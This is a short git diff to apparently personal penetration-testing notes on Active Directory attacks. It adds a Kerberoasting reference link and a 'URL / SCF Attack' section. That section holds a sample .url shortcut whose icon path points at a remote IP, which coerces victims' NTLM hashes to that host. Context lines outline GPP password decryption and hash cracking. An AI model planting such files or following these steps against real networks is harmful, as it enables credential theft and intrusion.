@@ -84,7 +84,7 @@ crack with hashcat
 ---
 ## Kerberoasting
 ---
-
+[kerberoasting hacktricks](https://book.hacktricks.xyz/windows/active-directory-methodology/kerberoast)
 [kerberoasting info](https://medium.com/mitigation@Shorty420/kerberoasting-9108477279cc)
 
 ### attack steps
@@ -106,5 +106,17 @@ locate cpassword in Groups.xml
 use gpp-decrypt to decrypt cpassword. 
 try to gain shell with creds
 
+---
+## URL / SCF Attack
+---
+
+file example
+```
+[InternetShortcut]
+URL=blah
+WorkingDirectory=blah
+IconFile=\\10.10.14.19\%USERNAME%.icon
+IconIndex=1
+```
 
 
